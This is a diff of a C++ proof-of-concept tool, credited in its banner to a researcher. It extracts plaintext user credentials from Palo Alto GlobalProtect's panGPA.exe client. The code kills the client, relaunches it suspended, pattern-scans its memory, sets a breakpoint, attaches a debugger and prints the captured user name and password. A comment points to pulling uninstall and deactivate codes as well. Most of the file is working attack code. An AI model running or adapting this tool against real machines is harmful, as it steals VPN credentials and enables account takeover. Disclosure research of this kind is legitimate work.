@@ -1,12 +1,7 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <iostream>
 #include <vector>
-#include <TlHelp32.h>
-#include <Psapi.h>
 #include <cstdlib>
-#include <iomanip>
-#include <cctype>
-#include <stack>
 #include <string>
 #pragma comment(lib, "Dbghelp.lib")
 
@@ -34,7 +29,6 @@ std::string htmlDecode(const std::string& str) {
     std::string decoded5 = searchAndReplace(decoded4, "&apos;", "'");
     return decoded5;
 }
-
 
 void prettyPrintXML(const std::vector<BYTE>& buffer, SIZE_T bytesRead) {
     // Convert buffer to string
@@ -68,18 +62,14 @@ void prettyPrintXML(const std::vector<BYTE>& buffer, SIZE_T bytesRead) {
             }
         }
     }
-    //std::string modified = searchAndReplace(original, search, replace);
+    // std::string modified = searchAndReplace(original, search, replace);
     // Print the extracted values
     std::string passwdValueDecoded = htmlDecode(passwdValue);
-    std::cout << "******************************" << std::endl;
+    std::cout << "************************************************************" << std::endl;
     std::cout << "User: " << userValue << std::endl;
     std::cout << "Password: " << passwdValueDecoded << std::endl;
-    std::cout << "******************************" << std::endl;
+    std::cout << "************************************************************" << std::endl;
 }
-
-
-
-
 
 void PrintAddressAtRSI(HANDLE hThread) {
     CONTEXT context;
@@ -94,7 +84,7 @@ void PrintAddressAtRSI(HANDLE hThread) {
         ULONG_PTR rsiAddress = context.Rsi;
         std::cout << "[*] Address at RSI: " << std::hex << rsiAddress << std::endl;
 
-        DWORD processId = GetProcessIdOfThread(hThread);  // Corrected function
+        DWORD processId = GetProcessIdOfThread(hThread);  
         if (processId == 0) {
             std::cerr << "[!] Failed to get process ID from thread handle. Error: " << GetLastError() << std::endl;
             ResumeThread(hThread);
@@ -156,7 +146,7 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, ULONG_PTR breakpointAddress) 
 
             // Check if the hit breakpoint is the one we set
             if (exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
-                std::cout << "\n\n[*] Hit the set breakpoint in thread HEX : " << std::hex << debugEvent.dwThreadId << std::endl;
+                std::cout << "[*] Hit the set breakpoint in thread HEX : " << std::hex << debugEvent.dwThreadId << std::endl;
                 HANDLE DebugThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                 if (DebugThread) {
                     DWORD exitCode;
@@ -274,30 +264,36 @@ ULONG_PTR MemSearch(DWORD processId, const std::vector<BYTE>& hexPattern) {
 int main() {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    std::cout << " ######   #####  ###    ##  ######  ######   #####      ####### #######  ###### ######  ####### ######## " << std::endl;
+
+    std::cout << " \n\n ######   #####  ###    ##  ######  ######   #####      ####### #######  ###### ######  ####### ######## " << std::endl;
     std::cout << " ##   ## ##   ## ####   ## ##       ##   ## ##   ##     ##      ##      ##      ##   ## ##         ##    " << std::endl;
     std::cout << " ######  ####### ## ##  ## ##   ### ######  #######     ####### #####   ##      ######  #####      ##    " << std::endl;
     std::cout << " ##      ##   ## ##  ## ## ##    ## ##      ##   ##          ## ##      ##      ##   ## ##         ##    " << std::endl;
     std::cout << " ##      ##   ## ##   ####  ######  ##      ##   ##     ####### #######  ###### ##   ## #######    ##    " << std::endl;
-    std::cout << "\n\n" << std::endl;
+    std::cout << "\n\n";
     std::cout << "             ####### ##   ## ######## ######   #####   ###### ########  ######  ######                   " << std::endl;
     std::cout << "             ##       ## ##     ##    ##   ## ##   ## ##         ##    ##    ## ##   ##                  " << std::endl;
     std::cout << "             #####     ###      ##    ######  ####### ##         ##    ##    ## ######                   " << std::endl;
     std::cout << "             ##       ## ##     ##    ##   ## ##   ## ##         ##    ##    ## ##   ##                  " << std::endl;
     std::cout << "             ####### ##   ##    ##    ##   ## ##   ##  ######    ##     ######  ##   ##                  " << std::endl;
     std::cout << "\n\n PoC for plaintext extraction of user credentials by @bbhacks - https://github.com/t3hbb/PanGP_Extractor\n" << std::endl;
+
+    // Close any currenttly running
     system("taskkill /IM PanGPA.exe /F > NUL 2>&1");
+    
+    // Start a new instance suspended so we can fettle it    
     if (!CreateProcess(L"C:\\Program Files\\Palo Alto Networks\\GlobalProtect\\panGPA.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
         std::cerr << "[!] Failed to create process. Error: " << GetLastError() << std::endl;
         return 1;
     }
     std::cout << "[*] Successfully created suspended process with PID: " << pi.dwProcessId << std::endl;
+
     // Define the pattern to search for
     std::vector<BYTE> pattern = { 0xBA, 0x2A, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0xF8, 0xE8, 0xA3, 0xC8, 0x37, 0x00, 0x48, 0x8D, 0x15 };
     //
     // You can set a second BP here and get the uninstall and deactivate password/codes but currently it faults ¯\_(ツ)_/¯
     // 
-    //std::vector<BYTE> pattern = { 0x48, 0x8D, 0x15, 0x51, 0x9C, 0x4C, 0x00 };
+    // std::vector<BYTE> pattern = { 0x48, 0x8D, 0x15, 0x51, 0x9C, 0x4C, 0x00 };
     
     
     
@@ -313,6 +309,7 @@ int main() {
     }
     else {
         std::cout << "[!] Pattern not found." << std::endl;
+        return 1;
     }
 
     // Set the breakpoint
@@ -328,47 +325,54 @@ int main() {
         }
         else {
             std::cerr << "[!] Failed to set breakpoint at address: " << std::hex << breakpointAddress << ". Error: " << GetLastError() << std::endl;
+            return 1;
         }
     }
     else {
         std::cerr << "[!] Failed to read memory at address: " << std::hex << breakpointAddress << ". Error: " << GetLastError() << std::endl;
+        return 1;
     }
 
+    // Resume the thread to start execution
+    DWORD resumeResult = ResumeThread(pi.hThread);
+    if (resumeResult == (DWORD)-1) {
+        std::cerr << "[!] Failed to resume thread. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+    else {
+        std::cout << "[*] Thread resumed successfully." << std::endl;
+        Sleep(500); //becuase f*ck multithreaded apps and exceptions
 
-
-        // Resume the thread to start execution
-        DWORD resumeResult = ResumeThread(pi.hThread);
-        if (resumeResult == (DWORD)-1) {
-            std::cerr << "[!] Failed to resume thread. Error: " << GetLastError() << std::endl;
-        }
-        else {
-            std::cout << "[*] Thread resumed successfully." << std::endl;
-            Sleep(500); //becuase fuck multithreaded apps and exceptions
-            // Debug the process
-            // Attach the debugger to the newly created process
-            if (DebugActiveProcess(pi.dwProcessId)) {
-                std::cout << "[*] Debugger attached to process with PID: " << std::dec << pi.dwProcessId << std::endl;
-                if (pi.hProcess != nullptr) {
-                    std::cout << "[*] Debugging Process" << std::endl;
-                    DebugProcess(pi.hThread, pi.hProcess, breakpointAddress);
-                    //HWBreak(pi.hThread, breakpointAddress);
-                }
-                else {
-                    std::cerr << "[!] Failed to attach debugger. Error: " << GetLastError() << std::endl;
-                }
+        // Debug the process
+        // Attach the debugger to the newly created process
+        if (DebugActiveProcess(pi.dwProcessId)) {
+            std::cout << "[*] Debugger attached to process with PID: " << std::dec << pi.dwProcessId << std::endl;
+            if (pi.hProcess != nullptr) {
+                std::cout << "[*] Debugging Process" << std::endl;
+                DebugProcess(pi.hThread, pi.hProcess, breakpointAddress);
+        
+                // Try a HW breakPint instead to see if it works
+                //HWBreak(pi.hThread, breakpointAddress);
+                // Spoiler :  It didn't
             }
             else {
-                std::cerr << "[!] Invalid process handle." << std::endl;
-            }
+                std::cerr << "[!] Failed to attach debugger. Error: " << GetLastError() << std::endl;
+                return 1;
+                }
         }
+        else {
+            std::cerr << "[!] Invalid process handle." << std::endl;
+            return 1;
+        }
+    }
     
-
-
     // Clean up
-    std::cerr << "\n\n[*] Cleaning Up ..." << std::endl;
-    TerminateProcess(pi.hProcess, 0);
+    std::cerr << "[*] Cleaning Up ..." << std::endl;
+
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
+    TerminateProcess(pi.hProcess, 0);
+
     std::cerr << "[*] Relaunching panGPA ..." << std::endl;; //  because I literally cannot be f@#ked to worry about restarting suspended threads for the PoC - see TODO etc." << std::endl;
     if (!CreateProcess(L"C:\\Program Files\\Palo Alto Networks\\GlobalProtect\\panGPA.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
         std::cerr << "Failed to restart process. Error: " << GetLastError() << std::endl;
@@ -382,4 +386,6 @@ int main() {
 
 // TODO
 // Restore value at breakpoints before resuming rather than relaunching the application
-// Firgure out why BP#2 causes the attached PanGPA to error by executing code at the base memory address :/
+// Figure out why BP#2 causes the attached PanGPA to error by executing code at the base memory address :/
+// Like literally the faulting address is the equivalent of 0x4000000 in x86
+// Clean Up Taskbar to remove ghost/orphaned icons
